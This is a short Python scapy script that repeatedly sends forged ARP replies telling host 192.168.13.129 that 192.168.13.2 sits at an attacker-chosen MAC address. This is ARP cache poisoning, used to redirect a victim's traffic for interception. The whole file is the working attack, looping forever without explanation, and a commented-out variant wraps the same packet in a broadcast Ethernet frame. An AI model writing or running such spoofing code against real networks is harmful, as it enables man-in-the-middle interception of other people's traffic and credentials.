from scapy.all import *
import time

# pkt = Ether(src="00:00:00:00:00:00", dst="ff:ff:ff:ff:ff:ff") / \
#     ARP(psrc="192.168.13.2", pdst="192.168.13.129", hwsrc="6a:08:3a:2f:5a:02") / \
#     IP(dst="192.168.13.129")
pkt = ARP(psrc="192.168.13.2", pdst="192.168.13.129", hwsrc="6a:08:3a:2f:5a:02") / \
    IP(src="192.168.13.2", dst="192.168.13.129")

while True:
    send(pkt)
    time.sleep(1)
